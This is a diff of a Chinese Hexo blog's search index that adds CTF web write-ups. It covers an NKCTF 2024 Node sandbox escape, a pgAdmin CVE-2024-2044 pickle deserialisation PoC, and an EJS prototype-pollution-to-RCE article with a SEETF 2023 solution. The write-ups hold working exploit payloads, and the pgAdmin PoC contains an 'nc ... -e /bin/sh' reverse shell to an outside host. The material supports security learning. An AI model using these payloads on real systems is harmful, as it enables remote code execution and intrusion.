+<p>如果<code>process.__filename</code>为null则回显源码，我们可以利用原型链污染<code>__filename</code>实现任意文件读取</p>
+<p>本解法利用反射去得到process对象</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))()</span><br><span class="line">        return p.__filename=&quot;/etc/passwd&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 &#x2F;secret 即可成功读取</p>
+<p>尝试读&#x2F;flag，返回permission denied, open ‘&#x2F;flag’，没权限直接读</p>
+<p>尝试读<code>./hack</code>，注意路径是<code>/app/hack.js</code>，提示<code>shell.js</code>跟进一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(&quot;shell&quot;); const p = require(&#x27;child_process&#x27;); p.execSync(process.env.command);</span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller;</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))();</span><br><span class="line">        p.env.command=&quot;whoami&quot;;</span><br><span class="line">        return p.mainModule.require(&quot;./shell&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h2><blockquote>
+<p>pgAdmin CVE-2024-2044</p>
+</blockquote>
+<p>猜测出用户和密码<code>tacooooo@qq.com tacooooo</code></p>
+<p>登陆后发现是pgAdmin 4，搜索一番发现有个很新的漏洞 <a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">参考文章</a></p>
+<p>poc.py如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b&#x27;\x80\x04\x95&#x27;</span><br><span class="line">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class="line">    b += b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b&#x27;\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    print(b)</span><br><span class="line">    return b</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # if len(sys.argv) != 2:</span><br><span class="line">    #     exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class="line">    # with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    #     f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;nc 115.236.153.172 41678 -e /bin/sh&quot;))</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;nc 5i781963p2.yicp.fun 58265 -e /bin/sh&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>直接<code>python3 poc.py</code>生成pickle文件（这里kali不行，用了其他师傅的Ubuntu生成的）</p>
+<p>上传成功后，修改cookie为<code>pga4_session=/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle!a</code></p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325235724144.png"></p>
+<p>然后成功反弹shell，在<code>proc/1/environ</code>找到flag</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240326001639956.png"></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -1973,6 +1973,81 @@
       </tags>
   </entry>
   <entry>
+    <title>ejs默认配置之原型链污染</title>
+    <url>/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</url>
+    <content><![CDATA[<p>ejs默认配置造成原型链污染</p>
+<span id="more"></span>
+
+<h1 id="ejs默认配置之原型链污染"><a href="#ejs默认配置之原型链污染" class="headerlink" title="ejs默认配置之原型链污染"></a>ejs默认配置之原型链污染</h1><p><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce#sspp_gadget">参考文章</a></p>
+<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>EJS维护者对原型链污染的问题有着很好的理解，并使用非常安全的函数清理他们创建的每个对象</p>
+<p>利用<code>Render()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.render = function (template, d, o) &#123;</span><br><span class="line">    var data = d || utils.createNullProtoObjWherePossible();</span><br><span class="line">    var opts = o || utils.createNullProtoObjWherePossible();</span><br><span class="line"></span><br><span class="line">    // No options object -- if there are optiony names</span><br><span class="line">    // in the data, copy them to options</span><br><span class="line">    if (arguments.length == 2) &#123;</span><br><span class="line">        utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return handleCache(opts, template)(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>以及<code>createNullProtoObjWherePossible()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.createNullProtoObjWherePossible = (function () &#123;</span><br><span class="line">    if (typeof Object.create == &#x27;function&#x27;) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return Object.create(null);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(&#123;__proto__: null&#125; instanceof Object)) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return &#123;__proto__: null&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Not possible, just pass through</span><br><span class="line">    return function () &#123;</span><br><span class="line">        return &#123;&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考文章是这么说的，分析上述代码，可以知道不能滥用原型链污染库内新创建的对象。因此，对于用户提供的对象来说情况并非如此，从 EJS 维护者的角度来看，用户向库提供的输入不是 EJS 的责任。</p>
+</blockquote>
+<p>如何理解呢，就是说我们提供的可以被污染的对象并不会遭到上述函数清理。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>渲染模板时ejs 动态创建函数，该函数将使用<strong>传递给它的数据</strong>组装模板。该函数是根据模板动态创建的字符串编译的。所有这些都发生在最终被调用的 Template 类的编译函数中，在这种情况下，当创建模板对象时，将使用受感染的选项。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.compile = function compile(template, opts) &#123;</span><br><span class="line">    var templ;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    templ = new Template(template, opts);</span><br><span class="line">    return templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>现在我们知道可以控制配置对象的原型后，那么就可以进一步利用</p>
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106161658664.png"></p>
+<p>我们已经知道当编译模板时，它会使用多个配置元素来处理模板中的代码片段，并将其转换为可执行的 JavaScript 函数。这些配置元素可能包括模板标签、控制流语句、输出语句等。不过其中大多数都使用<code>_JS_IDENTIFIER</code> 正则表达式进行清理</p>
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106162305462.png"></p>
+<p>但是并不意味着所有都会被正则清理，我们看向下面代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compile: function () &#123;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var src;</span><br><span class="line">    /** @type &#123;ClientFunction&#125; */</span><br><span class="line">    var fn;</span><br><span class="line">    var opts = this.opts;</span><br><span class="line">    var prepended = &#x27;&#x27;;</span><br><span class="line">    var appended = &#x27;&#x27;;</span><br><span class="line">    /** @type &#123;EscapeCallback&#125; */</span><br><span class="line">    var escapeFn = opts.escapeFunction;</span><br><span class="line">    /** @type &#123;FunctionConstructor&#125; */</span><br><span class="line">    var ctor;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : &#x27;undefined&#x27;;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (opts.client) &#123;</span><br><span class="line">      src = &#x27;escapeFn = escapeFn || &#x27; + escapeFn.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      if (opts.compileDebug) &#123;</span><br><span class="line">        src = &#x27;rethrow = rethrow || &#x27; + rethrow.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return returnedFn;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以知道将<code>opts.escapeFunction</code>赋值给<code>escapeFn</code>，如果<code>opts.client</code>存在，那么<code>escapeFn</code>就会在函数体内从而被调用</p>
+<p>由于 opts.client 和 opts.escapeFunction 默认情况下未设置，因此可以原型链污染它们到达eval接收器并实现RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__proto__&quot;: &#123;</span><br><span class="line">        &quot;client&quot;: 1,</span><br><span class="line">        &quot;escapeFunction&quot;: &quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Setup app</span><br><span class="line">const express = require(&quot;express&quot;);</span><br><span class="line">const app  = express();</span><br><span class="line">const port = 3000;</span><br><span class="line"></span><br><span class="line">// Select ejs templating library</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">// Routes</span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&quot;index&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/vuln&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    // simulate SSPP vulnerability</span><br><span class="line">    var a = req.query.a;</span><br><span class="line">    var b = req.query.b;</span><br><span class="line">    var c = req.query.c;</span><br><span class="line"></span><br><span class="line">    var obj = &#123;&#125;;</span><br><span class="line">    obj[a][b] = c;</span><br><span class="line"></span><br><span class="line">    res.send(&quot;OK!&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Start app</span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`App listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>GET传参payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次: /vuln?a=__proto__&amp;b=escapeFunction&amp;c=JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br><span class="line">第二次: /vuln?a=__proto__&amp;b=client&amp;c=true</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106163117582.png"></p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p><strong>[SEETF 2023]Express JavaScript Security</strong></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const BLACKLIST = [</span><br><span class="line">    &quot;outputFunctionName&quot;,</span><br><span class="line">    &quot;escapeFunction&quot;,</span><br><span class="line">    &quot;localsName&quot;,</span><br><span class="line">    &quot;destructuredLocals&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    return res.render(&#x27;index&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/greet&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    const data = JSON.stringify(req.query);</span><br><span class="line"></span><br><span class="line">    if (BLACKLIST.find((item) =&gt; data.includes(item))) &#123;</span><br><span class="line">        return res.status(400).send(&#x27;Can you not?&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res.render(&#x27;greet&#x27;, &#123;</span><br><span class="line">        ...JSON.parse(data),</span><br><span class="line">        cache: false</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Server listening on port 3000&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>分析一下，<code>app.set(&#39;view engine&#39;, &#39;ejs&#39;);</code>说明ejs模板是默认配置，在<code>/greet</code>路由下，接收GET参数并赋值给data变量，然后黑名单检测，调用ejs模板进行渲染其中解析data的json数据，说明ejs配置可控。</p>
+<p>我们前文利用的payload是有escapeFunction关键字的，并且污染的过程是我们手动添加<code>/vuln</code>上去的，所以我们要寻找可以利用的地方</p>
+<p>通常情况下，ejs模板只允许在数据对象中传递以下相对无害的选项</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _OPTS_PASSABLE_WITH_DATA = [&#x27;delimiter&#x27;, &#x27;scope&#x27;, &#x27;context&#x27;, &#x27;debug&#x27;, &#x27;compileDebug&#x27;,</span><br><span class="line">  &#x27;client&#x27;, &#x27;_with&#x27;, &#x27;rmWhitespace&#x27;, &#x27;strict&#x27;, &#x27;filename&#x27;, &#x27;async&#x27;];</span><br><span class="line">// We don&#x27;t allow &#x27;cache&#x27; option to be passed in the data obj for</span><br><span class="line">// the normal `render` call, but this is where Express 2 &amp; 3 put it</span><br><span class="line">// so we make an exception for `renderFile`</span><br><span class="line">var _OPTS_PASSABLE_WITH_DATA_EXPRESS = _OPTS_PASSABLE_WITH_DATA.concat(&#x27;cache&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>但是我们找到<code>settings[&#39;view options&#39;]</code>可用于将任意选项传递给EJS，这将是我们利用的点</p>
+<p>跟进一下，会调用shallowCopy()进行赋值给opts</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">viewOpts = data.settings[&#x27;view options&#x27;];</span><br><span class="line">if (viewOpts) &#123;</span><br><span class="line">  utils.shallowCopy(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而在渲染模板的时候会跟进到Template类中，发现关键语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说虽然escapeFunction被过滤了，但是我们可以利用opts.escape去替换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">settings[&#x27;view options&#x27;][escape]=...</span><br></pre></td></tr></table></figure>
+
+<p>将前文漏洞利用的payload稍加修改一下，然后添加上greet.ejs中的三个配置参数</p>
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106171750370.png"></p>
+<p>得到最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/greet?name=test&amp;font=test&amp;fontSize=test&amp;settings[view options][escape]=function()&#123;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;)&#125;&amp;settings[view options][client]=1</span><br></pre></td></tr></table></figure>
+
+<p>注：题目源码已经<code>JSON.stringify</code>了，<code>/readflag</code>可以在dockerfile中得到信息</p>
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106175700268.png"></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>模板注入</tag>
+        <tag>原型链污染</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>fastjson入门学习</title>
     <url>/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html</url>
     <content><![CDATA[<p>记录对java安全的初次探索</p>
@@ -2372,79 +2447,28 @@
       </categories>
   </entry>
   <entry>
-    <title>ejs默认配置之原型链污染</title>
-    <url>/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</url>
-    <content><![CDATA[<p>ejs默认配置造成原型链污染</p>
+    <title>博客常用设置</title>
+    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
+    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
 <span id="more"></span>
 
-<h1 id="ejs默认配置之原型链污染"><a href="#ejs默认配置之原型链污染" class="headerlink" title="ejs默认配置之原型链污染"></a>ejs默认配置之原型链污染</h1><p><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce#sspp_gadget">参考文章</a></p>
-<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>EJS维护者对原型链污染的问题有着很好的理解，并使用非常安全的函数清理他们创建的每个对象</p>
-<p>利用<code>Render()</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.render = function (template, d, o) &#123;</span><br><span class="line">    var data = d || utils.createNullProtoObjWherePossible();</span><br><span class="line">    var opts = o || utils.createNullProtoObjWherePossible();</span><br><span class="line"></span><br><span class="line">    // No options object -- if there are optiony names</span><br><span class="line">    // in the data, copy them to options</span><br><span class="line">    if (arguments.length == 2) &#123;</span><br><span class="line">        utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return handleCache(opts, template)(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>以及<code>createNullProtoObjWherePossible()</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.createNullProtoObjWherePossible = (function () &#123;</span><br><span class="line">    if (typeof Object.create == &#x27;function&#x27;) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return Object.create(null);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(&#123;__proto__: null&#125; instanceof Object)) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return &#123;__proto__: null&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Not possible, just pass through</span><br><span class="line">    return function () &#123;</span><br><span class="line">        return &#123;&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>参考文章是这么说的，分析上述代码，可以知道不能滥用原型链污染库内新创建的对象。因此，对于用户提供的对象来说情况并非如此，从 EJS 维护者的角度来看，用户向库提供的输入不是 EJS 的责任。</p>
-</blockquote>
-<p>如何理解呢，就是说我们提供的可以被污染的对象并不会遭到上述函数清理。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>渲染模板时ejs 动态创建函数，该函数将使用<strong>传递给它的数据</strong>组装模板。该函数是根据模板动态创建的字符串编译的。所有这些都发生在最终被调用的 Template 类的编译函数中，在这种情况下，当创建模板对象时，将使用受感染的选项。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.compile = function compile(template, opts) &#123;</span><br><span class="line">    var templ;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    templ = new Template(template, opts);</span><br><span class="line">    return templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>现在我们知道可以控制配置对象的原型后，那么就可以进一步利用</p>
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106161658664.png"></p>
-<p>我们已经知道当编译模板时，它会使用多个配置元素来处理模板中的代码片段，并将其转换为可执行的 JavaScript 函数。这些配置元素可能包括模板标签、控制流语句、输出语句等。不过其中大多数都使用<code>_JS_IDENTIFIER</code> 正则表达式进行清理</p>
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106162305462.png"></p>
-<p>但是并不意味着所有都会被正则清理，我们看向下面代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compile: function () &#123;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var src;</span><br><span class="line">    /** @type &#123;ClientFunction&#125; */</span><br><span class="line">    var fn;</span><br><span class="line">    var opts = this.opts;</span><br><span class="line">    var prepended = &#x27;&#x27;;</span><br><span class="line">    var appended = &#x27;&#x27;;</span><br><span class="line">    /** @type &#123;EscapeCallback&#125; */</span><br><span class="line">    var escapeFn = opts.escapeFunction;</span><br><span class="line">    /** @type &#123;FunctionConstructor&#125; */</span><br><span class="line">    var ctor;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : &#x27;undefined&#x27;;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (opts.client) &#123;</span><br><span class="line">      src = &#x27;escapeFn = escapeFn || &#x27; + escapeFn.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      if (opts.compileDebug) &#123;</span><br><span class="line">        src = &#x27;rethrow = rethrow || &#x27; + rethrow.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return returnedFn;</span><br></pre></td></tr></table></figure>
-
-<p>我们可以知道将<code>opts.escapeFunction</code>赋值给<code>escapeFn</code>，如果<code>opts.client</code>存在，那么<code>escapeFn</code>就会在函数体内从而被调用</p>
-<p>由于 opts.client 和 opts.escapeFunction 默认情况下未设置，因此可以原型链污染它们到达eval接收器并实现RCE</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__proto__&quot;: &#123;</span><br><span class="line">        &quot;client&quot;: 1,</span><br><span class="line">        &quot;escapeFunction&quot;: &quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Setup app</span><br><span class="line">const express = require(&quot;express&quot;);</span><br><span class="line">const app  = express();</span><br><span class="line">const port = 3000;</span><br><span class="line"></span><br><span class="line">// Select ejs templating library</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">// Routes</span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&quot;index&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/vuln&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    // simulate SSPP vulnerability</span><br><span class="line">    var a = req.query.a;</span><br><span class="line">    var b = req.query.b;</span><br><span class="line">    var c = req.query.c;</span><br><span class="line"></span><br><span class="line">    var obj = &#123;&#125;;</span><br><span class="line">    obj[a][b] = c;</span><br><span class="line"></span><br><span class="line">    res.send(&quot;OK!&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Start app</span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`App listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
 
-<p>GET传参payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次: /vuln?a=__proto__&amp;b=escapeFunction&amp;c=JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br><span class="line">第二次: /vuln?a=__proto__&amp;b=client&amp;c=true</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106163117582.png"></p>
-<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p><strong>[SEETF 2023]Express JavaScript Security</strong></p>
-<p>源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const BLACKLIST = [</span><br><span class="line">    &quot;outputFunctionName&quot;,</span><br><span class="line">    &quot;escapeFunction&quot;,</span><br><span class="line">    &quot;localsName&quot;,</span><br><span class="line">    &quot;destructuredLocals&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    return res.render(&#x27;index&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/greet&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    const data = JSON.stringify(req.query);</span><br><span class="line"></span><br><span class="line">    if (BLACKLIST.find((item) =&gt; data.includes(item))) &#123;</span><br><span class="line">        return res.status(400).send(&#x27;Can you not?&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res.render(&#x27;greet&#x27;, &#123;</span><br><span class="line">        ...JSON.parse(data),</span><br><span class="line">        cache: false</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Server listening on port 3000&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
-<p>分析一下，<code>app.set(&#39;view engine&#39;, &#39;ejs&#39;);</code>说明ejs模板是默认配置，在<code>/greet</code>路由下，接收GET参数并赋值给data变量，然后黑名单检测，调用ejs模板进行渲染其中解析data的json数据，说明ejs配置可控。</p>
-<p>我们前文利用的payload是有escapeFunction关键字的，并且污染的过程是我们手动添加<code>/vuln</code>上去的，所以我们要寻找可以利用的地方</p>
-<p>通常情况下，ejs模板只允许在数据对象中传递以下相对无害的选项</p>
